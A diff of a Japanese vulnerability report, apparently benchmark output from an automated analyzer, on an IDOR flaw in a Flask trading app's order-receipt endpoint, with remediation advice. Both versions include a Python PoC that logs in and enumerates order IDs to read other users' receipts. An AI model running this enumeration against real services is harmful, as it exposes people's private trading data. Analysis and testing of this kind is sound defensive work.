@@ -15,54 +15,35 @@
 
 ### Principals (データ源)
 
-- **order_id (URL path parameter)**: Untrusted
-  - Context: URLパスパラメータとしてユーザーから提供される注文ID (`/order/<int:order_id>/receipt`)
-  - Risk Factors: ユーザーが任意の値を指定可能, 連番による列挙攻撃が容易, 認可なしでリソースアクセスに使用される
+- **order_id**: Untrusted
+  - Context: URLパスパラメータとしてユーザーから直接入力される整数値
+  - Risk Factors: ユーザーが任意の値を指定可能, 連番で予測可能, 他のユーザーのリソースを参照可能
 - **session['user_id']**: SemiTrusted
   - Context: サーバーサイドセッションに保存された認証済みユーザーID
-  - Risk Factors: セッション固定攻撃のリスク, リソースアクセス制御に不十分な使用
-- **request.form['username']**: Untrusted
-  - Context: ログインフォームからのユーザー名入力
-  - Risk Factors: ユーザー列挙に使用可能, SQLインジェクション対策はORM経由で緩和されている
+  - Risk Factors: 認証のみを保証, 認可には使用されていない
 
 ### Actions (セキュリティ制御)
 
-- **session.get('user_id') 認証チェック**: Insufficient
-  - Function: ユーザーがログインしているかどうかを確認
-  - Weaknesses: 認証のみで認可チェックがない, リソース所有者の検証がない
-  - Bypass Vectors: 有効なセッションを持つ任意のユーザーが他のリソースにアクセス可能
-- **Order.query.get(order_id)**: Missing
-  - Function: データベースから注文を取得
-  - Weaknesses: order.user_id == session['user_id'] の検証がない, ユーザー提供のIDを直接使用
-  - Bypass Vectors: order_idを変更するだけで他ユーザーのデータにアクセス
+- **session.get('user_id')**: Insufficient
+  - Function: ユーザーがログインしているかの認証チェック
+  - Weaknesses: 認証のみで認可チェックがない, リソースの所有者検証なし
+  - Bypass Vectors: 任意のユーザーとしてログインすれば、他ユーザーのリソースにアクセス可能
 
 ### Resources (操作対象)
 
-- **Order (注文データ)**: High
-  - Operation: データベース読み取り
+- **Order.query.get(order_id)**: High
+  - Operation: データベース読み取り - 注文レシート情報
   - Protection: 認証チェック（不十分）
-- **User (ユーザーデータ)**: Critical
-  - Operation: データベース読み取り/認証
-  - Protection: セッション管理, パスワード認証（平文保存のリスク）
+- **order.receipt**: High
+  - Operation: ユーザーの取引情報（銘柄、数量、価格等）
+  - Protection: 
 
 ### Policy Violations
 
-#### AUTHZ-001: リソースアクセス時には認可チェック（所有者検証）が必要
+#### IDOR-001: ユーザーは自身のリソースにのみアクセスできるべき
 
-- **Path**: order_id (untrusted URL param) -> session.get('user_id') (認証のみ) -> Order.query.get(order_id) (認可なし)
+- **Path**: order_id (untrusted URL param) -> session check (認証のみ) -> Order.query.get() (認可なし) -> receipt.html (情報漏洩)
 - **Severity**: high
-- **Confidence**: 0.95
-
-#### SEC-002: パスワードはハッシュ化して保存すべき
-
-- **Path**: request.form['password'] -> User.query.filter_by(password=password) -> db.Column(db.String(100))
-- **Severity**: high
-- **Confidence**: 0.85
-
-#### ENUM-001: ユーザー列挙を防ぐために一貫したエラーメッセージを使用すべき
-
-- **Path**: request.form['username'] -> User.query.filter_by() -> 'User not found' vs 'Incorrect password'
-- **Severity**: medium
 - **Confidence**: 0.90
 
 ## マッチしたソースコード
@@ -78,107 +59,73 @@ def add_header(request):
 
 ## 詳細解析
 
-このFlask Webアプリケーションには**IDOR (Insecure Direct Object Reference) 脆弱性**が存在します。
+### 脆弱性の概要
 
-### 脆弱性の詳細
+`/order/<int:order_id>/receipt` エンドポイント（95-109行目）において、**IDOR（Insecure Direct Object Reference）脆弱性**が存在します。
 
-`order_receipt` 関数（94-109行目）では、ユーザーがセッションにログインしているかどうかを確認していますが、**リクエストされた `order_id` が現在ログインしているユーザーの注文に属しているかどうかの認可チェックが欠如**しています。
-
-具体的には:
-- 104行目: `order = Order.query.get(order_id)` でURLパスから受け取った `order_id` を直接使用してデータベースから注文を取得
-- 所有者の検証なし: 取得した `order.user_id` と `session['user_id']` の比較が行われていない
+### 問題点
+1. **認証のみで認可なし**: `session.get('user_id')` でユーザーがログインしているかどうかは確認していますが、リクエストされた `order_id` がそのユーザーに属するかどうかの確認がありません。
+2. **直接的なオブジェクト参照**: `Order.query.get(order_id)` でURLパラメータから直接注文を取得しており、所有者の検証を行っていません。
+3. **データモデルの関係性未活用**: `Order` モデルには `user_id` フィールドがあり、`User` モデルとの関連が定義されているにもかかわらず、この関係性が認可チェックに使用されていません。
 
 ### 攻撃シナリオ
-1. 攻撃者がアカウントを作成またはログイン
-2. `/order/1/receipt`, `/order/2/receipt`, `/order/3/receipt` 等、連番でorder_idを列挙
-3. 他のユーザーの注文情報（日付、銘柄、取引種別、数量、価格、レシート情報）にアクセス可能
-
-### 追加の脆弱性
-- **平文パスワード保存**: `password = db.Column(db.String(100), nullable=False)` でハッシュ化なし
-- **ユーザー列挙**: ログイン時に「User not found」と「Incorrect password」で異なるエラーメッセージを返す
+攻撃者がユーザーAとしてログインした後、`/order/1/receipt`、`/order/2/receipt`... と順番にリクエストすることで、他のユーザーの注文レシート情報（日付、銘柄、操作タイプ、数量、価格、レシート内容）を不正に閲覧できます。
 
 ## PoC（概念実証コード）
 
 ```text
-#!/usr/bin/env python3
-"""
-IDOR PoC - Trading Platform Order Receipt Access
-このスクリプトは他のユーザーの注文レシートにアクセスするIDOR脆弱性を実証します。
-
-【重要】このPoCは教育目的のみです。許可なくシステムに対して実行しないでください。
-"""
-
+# IDOR脆弱性のPoC（Proof of Concept）
 import requests
 
-# ターゲットURL（実際のテスト環境に合わせて変更）
+# ベースURL（実際の環境に合わせて変更）
 BASE_URL = "http://localhost:5000"
 
-def exploit_idor():
-    session = requests.Session()
-    
-    # Step 1: ログイン（有効な認証情報が必要）
-    # ベンチマークタグに "default_credentials" があるため、デフォルト認証情報が存在する可能性
-    login_data = {
-        "username": "testuser",
-        "password": "password123"
-    }
-    
-    # ユーザー名を送信
-    session.post(f"{BASE_URL}/", data={"username": login_data["username"]})
-    
-    # パスワードを送信
-    session.post(
-        f"{BASE_URL}/password/{login_data['username']}",
-        data={"password": login_data["password"]}
+# セッションを作成
+session = requests.Session()
+
+# 1. 攻撃者のアカウントでログイン
+# ログインフローを実行
+login_response = session.post(
+    f"{BASE_URL}/",
+    data={"username": "attacker_user"}
+)
+
+# パスワード入力
+password_response = session.post(
+    f"{BASE_URL}/password/attacker_user",
+    data={"password": "attacker_password"}
+)
+
+# 2. 他のユーザーのorder_idを推測してアクセス
+# order_idを1から順番に試行
+for order_id in range(1, 100):
+    receipt_response = session.get(
+        f"{BASE_URL}/order/{order_id}/receipt"
     )
     
-    # Step 2: 他のユーザーの注文レシートを列挙
-    print("[*] IDOR攻撃: 他ユーザーの注文レシートを取得中...")
-    
-    for order_id in range(1, 100):
-        response = session.get(f"{BASE_URL}/order/{order_id}/receipt")
-        
-        if response.status_code == 200 and "receipt" in response.text.lower():
-            print(f"[+] order_id={order_id}: レシート情報にアクセス成功")
-            # レスポンスから機密情報を抽出可能
-            # 例: 注文日、銘柄、取引種別、数量、価格など
+    if receipt_response.status_code == 200:
+        print(f"[+] order_id={order_id} のレシートを取得成功")
+        print(receipt_response.text[:500])  # レシート内容を表示
+        print("-" * 50)
 
-if __name__ == "__main__":
-    print("[!] これはIDOR脆弱性の実証コードです")
-    print("[!] 許可されたテスト環境でのみ使用してください")
-    # exploit_idor()  # 実行する場合はコメントを解除
+# 注意: このPoCは認可された環境でのみ使用してください
 ```
 
 ## 修復ガイダンス
 
-### order_receipt 関数
+### order_receipt関数
 
 - **Required**: 認可チェックの追加
-- **Guidance**: Order.query.get(order_id) の後に `if order.user_id != user_id: abort(403)` を追加して、リクエストしたユーザーが注文の所有者であることを確認する
-- **Priority**: critical
-
-### User モデル (パスワード保存)
-
-- **Required**: パスワードのハッシュ化
-- **Guidance**: werkzeug.security の generate_password_hash / check_password_hash を使用してパスワードをハッシュ化して保存する
+- **Guidance**: 注文を取得した後、order.user_idがsession['user_id']と一致するかを確認する。例: `order = Order.query.filter_by(id=order_id, user_id=user_id).first()` または取得後に `if order.user_id != user_id: abort(403)`
 - **Priority**: high
 
-### login / password 関数
+### データアクセス層
 
-- **Required**: 一貫したエラーメッセージ
-- **Guidance**: ユーザー名とパスワードのエラーで同じメッセージ（例: 'Invalid credentials'）を返す
+- **Required**: アクセス制御の一元化
+- **Guidance**: 現在のユーザーに属するリソースのみを返すユーティリティ関数やデコレータを作成し、すべてのリソースアクセスで使用する
 - **Priority**: medium
 
 ## 解析ノート
 
-コード分析を実施しました。Flask Webアプリケーションで、認証と注文管理機能を持っています。
-
-主要な脆弱性:
-1. **IDOR (Insecure Direct Object Reference)**: order_receipt関数(94-109行目)で、ユーザーがログインしているかどうかは確認していますが、リクエストされたorder_idが現在のユーザーの注文に属しているかどうかを確認していません。これにより、認証済みユーザーは他のユーザーの注文レシートにアクセスできます。
-
-2. **パスワードの平文保存**: models.pyでパスワードがString(100)として保存されており、ハッシュ化されていない可能性が高いです。
-
-3. **ユーザー列挙**: ログイン機能がユーザー名の存在を確認し、異なるエラーメッセージを返すため、攻撃者は有効なユーザー名を特定できます。
-
-benchmark.jsonから、これはIDOR脆弱性を検出するためのベンチマークであることが確認できました。
+コードを分析した結果、order_receipt関数にIDOR脆弱性を確認。ユーザーはログインしているかどうかのみチェックされるが、リクエストされたorder_idが実際にそのユーザーに属するものかどうかの認可チェックが行われていない。攻撃者は任意のorder_idを指定することで、他のユーザーの注文レシートを閲覧可能。コード内のコメントでも明示的にこの脆弱性が記述されている。
 
